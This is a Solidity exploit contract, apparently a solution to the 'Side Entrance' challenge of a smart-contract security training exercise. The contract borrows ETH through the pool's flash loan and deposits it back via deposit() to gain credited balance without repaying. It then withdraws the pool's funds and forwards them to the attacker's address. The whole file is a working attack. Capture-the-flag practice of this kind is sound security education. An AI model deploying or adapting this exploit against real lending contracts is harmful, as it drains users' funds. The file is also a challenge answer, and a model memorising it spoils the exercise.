// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "../side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceAttack {
	SideEntranceLenderPool immutable pool;
	address immutable owner;

	receive() external payable {}

	constructor(address _pool) {
		pool = SideEntranceLenderPool(_pool);
		owner = msg.sender;
	}

	function executeFlashLoan(uint256 _amount) external payable {
		require(owner == msg.sender);
		pool.flashLoan(_amount);
	}

	function execute() external payable {
		// Use the 1000 ETH received to call deposit() function on the pool,
		// and increment the balance of this contract in Pool's mapping to
		// 1000 ETH without actually incrementing the pool 's ETH balance.
		pool.deposit{ value: msg.value }();
	}

	function withdraw() external returns (bool) {
		require(owner == msg.sender);

		// Withdraw from pool's balance to this contract
		pool.withdraw();

		// Send from this contract to owner (attacker)
		(bool success, ) = owner.call{ value: address(this).balance }("");
		return success;
	}
}
